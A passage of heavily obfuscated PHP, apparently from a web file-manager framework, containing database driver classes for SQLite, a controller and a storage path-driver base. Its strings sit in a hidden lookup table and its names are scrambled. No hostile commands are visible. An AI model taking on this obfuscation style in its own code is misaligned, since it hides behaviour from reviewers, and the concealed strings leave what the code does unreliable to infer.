$é«µÄöÌüƒ); } } return $§ƒÅÍ¼µ¼Ç; } private function loadPluginList() { $ÉÂù =& $_SERVER[èÍ×öˆøÉ]; $™şÑÚåÇ = $this->loadList(); if (strtolower(MOD) == $ÉÂù[1878]) { return $™şÑÚåÇ; } $£³º´ëÃ²ùù = Hook::trigger($ÉÂù[1879], $™şÑÚåÇ); if ($™şÑÚåÇ && !$£³º´ëÃ²ùù) { die; } return $£³º´ëÃ²ùù ? $£³º´ëÃ²ùù : $™şÑÚåÇ; } private function pluginScan($Ç×‡Îå³ ) { $¬™ÃÌÄ =& $_SERVER[èÍ×öˆøÉ]; recursion_dir(PLUGIN_DIR, $¡ÎÉÚ½ÃÄã, $ŞŞË˜, 0); foreach ($¡ÎÉÚ½ÃÄã as $˜ÚÉéˆ‘û³) { $®‘È§¡£şÉ = get_path_this($˜ÚÉéˆ‘û³); if (isset($Ç×‡Îå³ [$®‘È§¡£şÉ]) || !file_exists($˜ÚÉéˆ‘û³ . $¬™ÃÌÄ[1880]) || !file_exists($˜ÚÉéˆ‘û³ . $¬™ÃÌÄ[1871])) { continue; } Hook::apply($®‘È§¡£şÉ . $¬™ÃÌÄ[1874]); } } } goto Bµ…¬ÙÅ‰š; f¡íëÊ¯À: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ò²·Ú =& $_SERVER[èÍ×öˆøÉ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ò²·Ú[6]] =& $config; $this->values[$ò²·Ú[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ò²·Ú[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($µÌÖãÙ¡çõ´) { if (1 === func_num_args()) { $this->{$µÌÖãÙ¡çõ´} = new $µÌÖãÙ¡çõ´(); } else { $ø‚ = new ReflectionClass($µÌÖãÙ¡çõ´); $õ®Å‘ÅË‡¯ = func_get_args(); array_shift($õ®Å‘ÅË‡¯); $this->{$µÌÖãÙ¡çõ´} = $ø‚->newInstanceArgs($õ®Å‘ÅË‡¯); } return $this->{$µÌÖãÙ¡çõ´}; } protected function assign($À, $ş‡) { $this->values[$À] = $ş‡; } protected function display($íº) { ob_end_clean(); extract($this->values); require $this->tpl . $íº; } } class DbSqliteBase extends Db { public function __construct($¸¶¤Ü = '') { $ÓÖÉ‘¾ÄÌ«° =& $_SERVER[èÍ×öˆøÉ]; if (!extension_loaded($ÓÖÉ‘¾ÄÌ«°[9])) { think_exception(think_lang($ÓÖÉ‘¾ÄÌ«°[10]) . $ÓÖÉ‘¾ÄÌ«°[11]); } if (!empty($¸¶¤Ü)) { if (!isset($¸¶¤Ü[$ÓÖÉ‘¾ÄÌ«°[12]])) { $¸¶¤Ü[$ÓÖÉ‘¾ÄÌ«°[12]] = 438; } $this->config = $¸¶¤Ü; if (empty($this->config[$ÓÖÉ‘¾ÄÌ«°[13]])) { $this->config[$ÓÖÉ‘¾ÄÌ«°[13]] = array(); } } } public function connect($˜×‚Š = '', $ôáÚ = 0) { $úÍ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($this->linkID[$ôáÚ])) { if (empty($˜×‚Š)) { $˜×‚Š = $this->config; } $ï = !empty($˜×‚Š[$úÍ[13]][$úÍ[14]]) ? $˜×‚Š[$úÍ[13]][$úÍ[14]] : $this->pconnect; $»©˜ó³ = $ï ? $úÍ[15] : $úÍ[16]; $this->linkID[$ôáÚ] = $»©˜ó³($˜×‚Š[$úÍ[17]], $˜×‚Š[$úÍ[12]]); if (!$this->linkID[$ôáÚ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ôáÚ], 30000); if (1 != think_config($úÍ[18])) { unset($this->config); } } return $this->linkID[$ôáÚ]; } public function free() { $this->queryID = null; } public function query($îã°ªĞÊê›Õ) { $ÊùÊŞ€âÅÁ =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $îã°ªĞÊê›Õ; if ($this->queryID) { $this->free(); } think_action_status($ÊùÊŞ€âÅÁ[19], 1); think_status($ÊùÊŞ€âÅÁ[20]); $this->queryID = sqlite_query($this->_linkID, $îã°ªĞÊê›Õ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Â = $this->getAll(); return $Â; } } public function execute($Ï) { $µÑº =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ï; if ($this->queryID) { $this->free(); } think_action_status($µÑº[21], 1); think_status($µÑº[20]); $Œ = sqlite_exec($this->_linkID, $Ï); $this->debug(); if (!1 === $Œ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[èÍ×öˆøÉ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹µÏ¶Î = sqlite_query($this->_linkID, $_SERVER[èÍ×öˆøÉ][23]); if (!$¹µÏ¶Î) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ê×³ƒã = sqlite_query($this->_linkID, $_SERVER[èÍ×öˆøÉ][24]); if (!$ê×³ƒã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $åëÔÍğ = array(); if ($this->numRows > 0) { for ($ûÇ¹ÚŠ˜ = 0; $ûÇ¹ÚŠ˜ < $this->numRows; $ûÇ¹ÚŠ˜++) { $åëÔÍğ[$ûÇ¹ÚŠ˜] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $åëÔÍğ; } public function getFields($»Â) { $º¥å =& $_SERVER[èÍ×öˆøÉ]; $¶¼ÙÖ¶İÀ = $this->query($º¥å[25] . $»Â . $º¥å[26]); $¤…‹“¤ì  = array(); if ($¶¼ÙÖ¶İÀ) { foreach ($¶¼ÙÖ¶İÀ as $­£ => $³Œ) { $¤…‹“¤ì [$³Œ[$º¥å[27]]] = array($º¥å[28] => $³Œ[$º¥å[27]], $º¥å[29] => $³Œ[$º¥å[30]], $º¥å[31] => (bool) ($³Œ[$º¥å[32]] === $º¥å[33]), $º¥å[34] => $³Œ[$º¥å[35]], $º¥å[36] => strtolower($³Œ[$º¥å[37]]) == $º¥å[38], $º¥å[39] => strtolower($³Œ[$º¥å[40]]) == $º¥å[41]); } } return $¤…‹“¤ì ; } public function getTables($ì¥—¯›Êõõ = '') { $Û¬ÙüÇì =& $_SERVER[èÍ×öˆøÉ]; $· = $this->query($Û¬ÙüÇì[42] . $Û¬ÙüÇì[43] . $Û¬ÙüÇì[44]); $åÉ¡·ë = array(); foreach ($· as $Ûä => $Şº“») { $åÉ¡·ë[$Ûä] = current($Şº“»); } return $åÉ¡·ë; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÜÊæ¯ =& $_SERVER[èÍ×öˆøÉ]; $€äÍ²ùòå’º = sqlite_last_error($this->_linkID); $this->error = $€äÍ²ùòå’º . $ÜÊæ¯[4] . sqlite_error_string($€äÍ²ùòå’º); if ($ÜÊæ¯[33] != $this->queryStr) { $this->error .= LNG($ÜÊæ¯[45]) . $this->queryStr; } think_trace($this->error, $ÜÊæ¯[33], $ÜÊæ¯[46]); return $this->error; } public function escapeString($óÅÎ) { return sqlite_escape_string($óÅÎ); } public function parseLimit($úû¬¢±Òë€Õ) { $¸­ÆÖ =& $_SERVER[èÍ×öˆøÉ]; $™Ôçäè = $¸­ÆÖ[33]; if (!empty($úû¬¢±Òë€Õ)) { $úû¬¢±Òë€Õ = explode($¸­ÆÖ[47], $úû¬¢±Òë€Õ); if (count($úû¬¢±Òë€Õ) > 1) { $™Ôçäè .= $¸­ÆÖ[48] . $úû¬¢±Òë€Õ[1] . $¸­ÆÖ[49] . $úû¬¢±Òë€Õ[0] . $¸­ÆÖ[50]; } else { $™Ôçäè .= $¸­ÆÖ[48] . $úû¬¢±Òë€Õ[0] . $¸­ÆÖ[50]; } } return $™Ôçäè; } } class DbSqlite3Base extends Db { public function __construct($æ = '') { $İ =& $_SERVER[èÍ×öˆøÉ]; if (!class_exists($İ[51])) { think_exception(think_lang($İ[10]) . $İ[52]); } if (!empty($æ)) { if (!isset($æ[$İ[12]])) { $æ[$İ[12]] = 438; } $this->config = $æ; if (empty($this->config[$İ[13]])) { $this->config[$İ[13]] = array(); } } } public function connect($óŠŒÚ = '', $ÄŠ = 0) { $”ì›«Á =& $_SERVER[èÍ×öˆøÉ]; if (!isset($this->linkID[$ÄŠ])) { if (empty($óŠŒÚ)) { $óŠŒÚ = $this->config; } $this->linkID[$ÄŠ] = new SQLite3($óŠŒÚ[$”ì›«Á[17]]); if (!$this->linkID[$ÄŠ]) { think_exception($this->linkID[$ÄŠ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÄŠ]->busyTimeout(30000); if (1 != think_config($”ì›«Á[18])) { unset($this->config); } } return $this->linkID[$ÄŠ]; } public function free() { $this->queryID = null; } public function query($ã¤) { $­£§ÖÛ½ßéä =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ã¤; if ($this->queryID) { $this->free(); } think_action_status($­£§ÖÛ½ßéä[19], 1); think_status($­£§ÖÛ½ßéä[20]); $this->queryID = $this->_linkID->query($ã¤); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ùĞ†¼³²­ØÌˆ = $this->getAll(); $this->numRows = count($ùĞ†¼³²­ØÌˆ); return $ùĞ†¼³²­ØÌˆ; } } public function execute($ë) { $§¯Õ›‡À´¿¢ã =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ë; if ($this->queryID) { $this->free(); } think_action_status($§¯Õ›‡À´¿¢ã[21], 1); think_status($§¯Õ›‡À´¿¢ã[20]); $Ç = $this->_linkID->exec($ë); $this->debug(); if (!1 === $Ç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[èÍ×öˆøÉ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ÿ = $this->_linkID->query($_SERVER[èÍ×öˆøÉ][23]); if (!$Ÿ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¦›© = $this->_linkID->query($_SERVER[èÍ×öˆøÉ][24]); if (!$¦›©) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $üïûï = array(); while ($Ìœé’¢ì¬ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $üïûï[] = $Ìœé’¢ì¬; } $this->queryID->reset(); return $üïûï; } public function getFields($¤) { $¸†Åô¢é =& $_SERVER[èÍ×öˆøÉ]; $“Ä„¢íô = $this->query($¸†Åô¢é[25] . $¤ . $¸†Åô¢é[26]); $§›¢Ô±ŒûÕ = array(); if ($“Ä„¢íô) { foreach ($“Ä„¢íô as $»É™´ş => $ŞÁÕãÊı) { $§›¢Ô±ŒûÕ[$ŞÁÕãÊı[$¸†Åô¢é[28]]] = array($¸†Åô¢é[28] => $ŞÁÕãÊı[$¸†Åô¢é[28]], $¸†Åô¢é[29] => $ŞÁÕãÊı[$¸†Åô¢é[29]], $¸†Åô¢é[31] => (bool) ($ŞÁÕãÊı[$¸†Åô¢é[31]] === $¸†Åô¢é[33]), $¸†Åô¢é[34] => $ŞÁÕãÊı[$¸†Åô¢é[53]], $¸†Åô¢é[36] => (bool) $ŞÁÕãÊı[$¸†Åô¢é[54]], $¸†Åô¢é[39] => (bool) $ŞÁÕãÊı[$¸†Åô¢é[54]]); } } return $§›¢Ô±ŒûÕ; } public function getTables($òŸ³ = '') { $¥úĞ”÷°úé =& $_SERVER[èÍ×öˆøÉ]; $ êÜÅ¥Ô = $this->query($¥úĞ”÷°úé[42] . $¥úĞ”÷°úé[43] . $¥úĞ”÷°úé[44]); $¿Ï = array(); foreach ($ êÜÅ¥Ô as $æÀ©‘Í°»å => $‚Û¯ŸôûÍ­) { $¿Ï[$æÀ©‘Í°»å] = current($‚Û¯ŸôûÍ­); } return $¿Ï; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ô¼ =& $_SERVER[èÍ×öˆøÉ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ô¼[33] != $this->queryStr) { $this->error .= LNG($ô¼[45]) . $this->queryStr; } think_trace($this->error, $ô¼[33], $ô¼[46]); return $this->error; } public function escapeString($Õ) { $ã‡ ¡€şò² =& $_SERVER[èÍ×öˆøÉ]; if ($this->_linkID) { return $this->_linkID->escapeString($Õ); } return str_ireplace($ã‡ ¡€şò²[55], $ã‡ ¡€şò²[56], $Õ); } public function parseLimit($¡¿Ãìâ€íòù) { $ğ =& $_SERVER[èÍ×öˆøÉ]; $£î = $ğ[33]; if (!empty($¡¿Ãìâ€íòù)) { $¡¿Ãìâ€íòù = explode($ğ[47], $¡¿Ãìâ€íòù); if (count($¡¿Ãìâ€íòù) > 1) { $£î .= $ğ[48] . $¡¿Ãìâ€íòù[1] . $ğ[49] . $¡¿Ãìâ€íòù[0] . $ğ[50]; } else { $£î .= $ğ[48] . $¡¿Ãìâ€íòù[0] . $ğ[50]; } } return $£î; } } goto cè…ç÷äÙ×; cè…ç÷äÙ×: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $³æåë£¡ß·„ø =& $_SERVER[èÍ×öˆøÉ]; $this->objectDriver = array($³æåë£¡ß·„ø[57], $³æåë£¡ß·„ø[58], $³æåë£¡ß·„ø[59], $³æåë£¡ß·„ø[60], $³æåë£¡ß·„ø[61], $³æåë£¡ß·„ø[62], $³æåë£¡ß·„ø[63], $³æåë£¡ß·„ø[64], $³æåë£¡ß·„ø[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($İŠÌÑØš›) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($İŠÌÑØš›, $_SERVER[èÍ×öˆøÉ][8]); } return $İŠÌÑØš›; } public function iconvApp($œóî) { return $œóî; } public function iconvSystem($ì) { return $ì; } public function iconvTo($ÔñÂ, $Òá†™õ, $ñ¯¿µ²½) { $ûÀÕÜµ©¼Î =& $_SERVER[èÍ×öˆøÉ]; if (!$ÔñÂ || !function_exists($ûÀÕÜµ©¼Î[66])) { return $ÔñÂ; } static $‹º£ = array(); $å—šçø = $Òá†™õ . $ûÀÕÜµ©¼Î[67] . $ñ¯¿µ²½ . $ûÀÕÜµ©¼Î[68] . $ÔñÂ; if (isset($‹º£[$å—šçø])) { return $‹º£[$å—šçø]; } if (function_exists($ûÀÕÜµ©¼Î[69])) { $¶‡…ˆ’œ®–»Ä = @mb_convert_encoding($ÔñÂ, $ñ¯¿µ²½, $Òá†™õ); } else { $¶‡…ˆ’œ®–»Ä = @iconv($Òá†™õ, $ñ¯¿µ²½, $ÔñÂ); } $¶‡…ˆ’œ®–»Ä = $¶‡…ˆ’œ®–»Ä ? $¶‡…ˆ’œ®–»Ä : $ÔñÂ; if (strstr($¶‡…ˆ’œ®–»Ä, $ûÀÕÜµ©¼Î[70])) { $¶‡…ˆ’œ®–»Ä = str_replace($ûÀÕÜµ©¼Î[70], $ûÀÕÜµ©¼Î[71], $¶‡…ˆ’œ®–»Ä); } $‹º£[$Òá†™õ . $ûÀÕÜµ©¼Î[67] . $ñ¯¿µ²½ . $ûÀÕÜµ©¼Î[68] . $ÔñÂ] = $¶‡…ˆ’œ®–»Ä; $‹º£[$ñ¯¿µ²½ . $ûÀÕÜµ©¼Î[67] . $Òá†™õ . $ûÀÕÜµ©¼Î[68] . $ÔñÂ] = $ÔñÂ; $‹º£[$ñ¯¿µ²½ . $ûÀÕÜµ©¼Î[67] . $Òá†™õ . $ûÀÕÜµ©¼Î[68] . $¶‡…ˆ’œ®–»Ä] = $ÔñÂ; $‹º£[$Òá†™õ . $ûÀÕÜµ©¼Î[67] . $ñ¯¿µ²½ . $ûÀÕÜµ©¼Î[68] . $¶‡…ˆ’œ®–»Ä] = $¶‡…ˆ’œ®–»Ä; return $¶‡…ˆ’œ®–»Ä; } public function getPathInner($Û¿şóÒ°×½) { $Â±ÛŠ®©Æ = IO::init($Û¿şóÒ°×½); return $Â±ÛŠ®©Æ->path; } public function getPathOuter($Ñéœ¦õ) { $„×à¢Œ¿ =& $_SERVER[èÍ×öˆøÉ]; $ŒØä¢ó©Òƒ…’ = strlen(trim($this->pathBase, $„×à¢Œ¿[8])); $Ñéœ¦õ = substr(trim($Ñéœ¦õ, $„×à¢Œ¿[8]), $ŒØä¢ó©Òƒ…’); return $this->pathDriver . $„×à¢Œ¿[8] . ltrim($Ñéœ¦õ, $„×à¢Œ¿[8]); } public function isParentOf($ê‰Œµíå¦, $ıµÂˆáûÆ’ˆŞ) { $—’ö =& $_SERVER[èÍ×öˆøÉ]; $ê‰Œµíå¦ = rtrim(strtolower($ê‰Œµíå¦), $—’ö[8]) . $—’ö[8]; $ıµÂˆáûÆ’ˆŞ = rtrim(strtolower($ıµÂˆáûÆ’ˆŞ), $—’ö[8]) . $—’ö[8]; $‹íÏåô„á‘È = strpos($ıµÂˆáûÆ’ˆŞ, $ê‰Œµíå¦) === 0; return $‹íÏåô„á‘È; } public function getType() { $÷˜Û— =& $_SERVER[èÍ×öˆøÉ]; $°ø = str_replace($÷˜Û—[72], $÷˜Û—[33], get_class($this)); return strtolower($°ø); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($³, $®±îÕÁ¨‹) { $¸ŠÕÜ =& $_SERVER[èÍ×öˆøÉ]; $ß¬‹ = rtrim($³, $¸ŠÕÜ[8]) . $¸ŠÕÜ[8] . $®±îÕÁ¨‹; $áä”±Ğœ = $this->exist($ß¬‹); return $áä”±Ğœ ? $ß¬‹ : !1; } public function setModifyTime($‡„ÃÙ£, $‡ = '') { } public function renameObject($£, $Íü¼ü•„‰öŸ) { $Ëƒ =& $_SERVER[èÍ×öˆøÉ]; $ÂÕ–ï¾¥ = $Íü¼ü•„‰öŸ; Hook::trigger($Ëƒ[73], $this, $£, $this, $this->pathFather($£) . $Íü¼ü•„‰öŸ); $£ = $this->getPathOuter($£); $Íü¼ü•„‰öŸ = $this->pathFather($£) . $Íü¼ü•„‰öŸ; if (IO::isFile($£)) { $¶û¶ôÉØÛÃ = IO::copy($£, $this->pathFather($£), REPEAT_RENAME_FOLDER, $ÂÕ–ï¾¥); if ($¶û¶ôÉØÛÃ) { IO::remove($£); } } else { $¶û¶ôÉØÛÃ = IO::mkdir($Íü¼ü•„‰öŸ); if (!$¶û¶ôÉØÛÃ) { return !1; } $ÖÁ­õıøÍ = IO::listPath($£, !0); $¡öÃüˆÃ„ = array_merge($ÖÁ­õıøÍ[$Ëƒ[74]], $ÖÁ­õıøÍ[$Ëƒ[75]]); foreach ($¡öÃüˆÃ„ as $„ÍÎ“) { IO::move($„ÍÎ“[$Ëƒ[76]], $Íü¼ü•„‰öŸ, REPEAT_RENAME_FOLDER); } IO::remove($£); } return $¶û¶ôÉØÛÃ ? $Íü¼ü•„‰öŸ : !1; } public function tempFile($”¥ = '', $ÑÅçÊ = '') { if (!$”¥) { $”¥ = rand_string(15); } $©Œó¥’åÒ = TEMP_FILES . rand_string(15) . $_SERVER[èÍ×öˆøÉ][8]; @mkdir($©Œó¥’åÒ, DEFAULT_PERRMISSIONS, !0); $†˜ „•Û = $©Œó¥’åÒ . $”¥; @touch($†˜ „•Û); if ($ÑÅçÊ) { file_put_contents($†˜ „•Û, $ÑÅçÊ); } return $†˜ „•Û; } public function tempFileRemve($›±ò¬¯ıéë) { @unlink($›±ò¬¯ıéë); @rmdir($this->pathFather($›±ò¬¯ıéë)); } public function mkfile($©º¡Ìêô, $›È¢µÚ•ä = '', $Œíõİ¦¬ü = REPEAT_RENAME) { } public function mkdir($•è, $ã¸Îº®¼ = REPEAT_SKIP) { } public function delFile($êÛŞ‰ø×) { } public function delFolder($Ö„•çù) { } public function copyFile($Ã‡ğ‚–, $£œ«™) { } public function moveFile($”¹Ô„íÌ¸, $·Õ) { } public function remove($¬¶Ãšè) { if ($this->isFile($¬¶Ãšè)) { return $this->delFile($¬¶Ãšè); } return $this->delFolder($¬¶Ãšè); } public function rename($Êœ˜, $¸) { } public function exist($ÇÉ†³) { } public function findByHash($µı‰˜÷’¸‚‚ = '', $ÌşœÜ¦ë = '') { return !1; } public function isFile($­ºì±˜¡) { } public function isFolder($ö) { } public function size($†ƒ) { } public function info($óâŞÃƒ¡Üğü×) { } public function infoSimple($™) { return $this->info($™); } public function infoAuth($›) { return $this->info($›); } public function infoFull($³ï) { return $this->info($³ï); } public function infoWithChildren($•´˜) { $¯… =& $_SERVER[èÍ×öˆøÉ]; static $á = array(); if (isset($á[$•´˜])) { return $á[$•´˜]; } $ëæŸ– = $this->info($•´˜); if ($ëæŸ– && $ëæŸ–[$¯…[29]] == $¯…[77]) { $ºöçƒàà”æ¸Ô = array($¯…[78] => 0, $¯…[79] => 0, $¯…[80] => 0); $this->infoChildren($•´˜, $ºöçƒàà”æ¸Ô); $ëæŸ–[$¯…[78]] = $ºöçƒàà”æ¸Ô[$¯…[78]]; $ëæŸ–[$¯…[81]] = array($¯…[82] => $ºöçƒàà”æ¸Ô[$¯…[79]], $¯…[83] => $ºöçƒàà”æ¸Ô[$¯…[80]]); $á[$•´˜] = $ëæŸ–; } return $ëæŸ–; } public function listPath($’ »ÁŠÖËÂåÔ, $™Ş– = false) { } public function has($½‚”ĞÈíÀ, $‰Ê‘‚œªœ·Õ = false, $Å™ÍÅŒ¯âÈöÒ = false) { } public function canRead($¾‘¶µÇ˜¦Ùô) { } public function canWrite($Å…Ò) { } public function getContent($¾ƒŸšµÈ) { } public function setContent($ ÖÛİ÷¥Ò…, $„Ñ½ = '') { } protected function infoChildren($±Éêææªñßº, &$¡ªÑ×) { $¡ =& $_SERVER[èÍ×öˆøÉ]; check_abort_echo(); $¤üô› = $this->listPath($±Éêææªñßº, !0); $¤üô› = array_merge($¤üô›[$¡[75]], $¤üô›[$¡[74]]); foreach ($¤üô› as $„å‹½óÅ…) { if ($„å‹½óÅ…[$¡[29]] == $¡[77]) { $¡ªÑ×[$¡[80]]++; $Â­ = $this->getPathInner($„å‹½óÅ…[$¡[76]]); $this->infoChildren($Â­, $¡ªÑ×); } else { $¡ªÑ×[$¡[79]]++; $¡ªÑ×[$¡[78]] += $„å‹½óÅ…[$¡[78]]; } } } public function fileSubstr($ó“ÆÌíºêØˆ, $œ¾¾˜œÓ¬ûğê, $ÏªÛ¥ç) { } public function listAll($ÂØß) { } public function listAllMake($Ãí¹ù¢, &$Æ®È‹œÆá†€) { $¤•…µä =& $_SERVER[èÍ×öˆøÉ]; check_abort_echo(); $É›­ÜÛÂ‡¸å = $this->listPath($Ãí¹ù¢, !0); if (!$É›­ÜÛÂ‡¸å) { return; } $ª— = array_merge($É›­ÜÛÂ‡¸å[$¤•…µä[75]], $É›­ÜÛÂ‡¸å[$¤•…µä[74]]); foreach ($ª— as $Ø¾ëôã€) { $¬‹Ã³—ô = $Ø¾ëôã€[$¤•…µä[29]] == $¤•…µä[77]; $Ñ‘ìÎ‚Ù = array($¤•…µä[76] => $Ø¾ëôã€[$¤•…µä[76]], $¤•…µä[77] => $¬‹Ã³—ô); if (isset($Ø¾ëôã€[$¤•…µä[78]])) { $Ñ‘ìÎ‚Ù[$¤•…µä[78]] = $Ø¾ëôã€[$¤•…µä[78]]; } if (isset($Ø¾ëôã€[$¤•…µä[84]])) { $Ñ‘ìÎ‚Ù[$¤•…µä[84]] = $Ø¾ëôã€[$¤•…µä[84]]; } if (!$¬‹Ã³—ô) { $Æ®È‹œÆá†€[] = $Ñ‘ìÎ‚Ù; continue; } $Æ®È‹œÆá†€[] = $Ñ‘ìÎ‚Ù; $this->listAllMake($Ø¾ëôã€[$¤•…µä[76]], $Æ®È‹œÆá†€); } } public function listAllSimple($³’³øÄ€¬¾§) { $´™¿°í·Ú =& $_SERVER[èÍ×öˆøÉ]; $ØÚı¹Â„ = array(); $ñÊú´·ë = $this->listAll($³’³øÄ€¬¾§); $Ùé¿Ìª¹†¶‹ = $this->getPathOuter($³’³øÄ€¬¾§); foreach ($ñÊú´·ë as $¢©Ÿ„äÊÄ÷) { $ãÏÏÇ = $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[76]]; $™†ç³© = $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[76]]; if (isset($¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[85]])) { $ãÏÏÇ = $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[85]][$´™¿°í·Ú[76]]; $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[78]] = $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[85]][$´™¿°í·Ú[78]]; $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[84]] = $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[85]][$´™¿°í·Ú[84]]; } else { $™†ç³© = substr($¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[76]], strlen(get_path_father($Ùé¿Ìª¹†¶‹))); $™†ç³© = $´™¿°í·Ú[8] . ltrim($™†ç³©, $´™¿°í·Ú[8]); } $ÏŒ = array($´™¿°í·Ú[76] => $™†ç³©, $´™¿°í·Ú[77] => $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[77]]); if (isset($¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[78]]) && !$¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[77]]) { $ÏŒ[$´™¿°í·Ú[78]] = $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[78]]; } if (isset($¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[84]])) { $ÏŒ[$´™¿°í·Ú[84]] = $¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[84]]; } if (!$¢©Ÿ„äÊÄ÷[$´™¿°í·Ú[77]]) { $ÏŒ[$´™¿°í·Ú[86]] = $ãÏÏÇ; } $ØÚı¹Â„[] = $ÏŒ; } return $ØÚı¹Â„; } public function upload($¬ŸËíâ¥…¾£, $–ä¹ö, $ğ©¢³Õ = false, $Ê¦ğ¶ = REPEAT_REPLACE) { } public function uploadFileByID($ŸÊÀ©”, $ÑĞ, $¡…ÁıÛÌìêŒ°) { } public function uploadFileByPath($ô, $«Ïí¦¨¹ë€¾™, $¼õ = array()) { } public function isUploadServer() { $›û =& $_SERVER[èÍ×öˆøÉ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $›û[87]) { return !0; } return $GLOBALS[$›û[6]][$›û[88]][$›û[89]]; } public function isFileOutServer() { $¶€‡§¦Ü =& $_SERVER[èÍ×öˆøÉ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¶€‡§¦Ü[87]) { return !0; } return $GLOBALS[$¶€‡§¦Ü[6]][$¶€‡§¦Ü[88]][$¶€‡§¦Ü[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ô«ÈÆí) { $Éçè¦ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->isCdnHost()) { return $ô«ÈÆí; } return str_replace(trim(get_url_root($ô«ÈÆí), $Éçè¦[8]), trim($this->cdnHost, $Éçè¦[8]), $ô«ÈÆí); } public function uploadLink($¥, $Åè—Øî¯—¤ = 0) { $è¦ÇÊ =& $_SERVER[èÍ×öˆøÉ]; if ($this->isUploadServer()) { return; } $ŞäÔ¬¾Ôİïõ§ = $this->getType(); if (!in_array($ŞäÔ¬¾Ôİïõ§, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $õ›Ë‰ = 1024 * 1024 * 10; $–Õë„‰ø = $Åè—Øî¯—¤ <= $õ›Ë‰ ? $è¦ÇÊ[91] : $è¦ÇÊ[92]; $¯¡ÅÄä˜êñ = (!$Åè—Øî¯—¤ ? 1 : ceil($Åè—Øî¯—¤ / pow(1024, 3))) * 3600 * 4; $µŞÃ¾õÕ = $this->{$–Õë„‰ø}($¥, $¯¡ÅÄä˜êñ); if ($µŞÃ¾õÕ) { $µŞÃ¾õÕ[$è¦ÇÊ[93]] = $¥; $µŞÃ¾õÕ[$è¦ÇÊ[94]] = $ŞäÔ¬¾Ôİïõ§; } return $µŞÃ¾õÕ; } public function uploadFormData($É¹ÏúÁÖŞ¢, $éĞº½°÷ = 3600) { } public function multiUploadFormData($©¹ğ¡¦, $îá = 3600) { } public function download($¶ËÕÜ, $ê’‹¹) { } public function ext($¯´™Õ¿ÇìÉö) { $µÎ—ı¨‚Ø‘£ =& $_SERVER[èÍ×öˆøÉ]; if (strpos($¯´™Õ¿ÇìÉö, $µÎ—ı¨‚Ø‘£[8]) === -1) { $”Æ„× = $¯´™Õ¿ÇìÉö; } else { $”Æ„× = $this->pathThis($¯´™Õ¿ÇìÉö); } $åò¯¼„Òà’š = $µÎ—ı¨‚Ø‘£[33]; if (strstr($”Æ„×, $µÎ—ı¨‚Ø‘£[95])) { $åò¯¼„Òà’š = substr($”Æ„×, strrpos($”Æ„×, $µÎ—ı¨‚Ø‘£[95]) + 1); $åò¯¼„Òà’š = 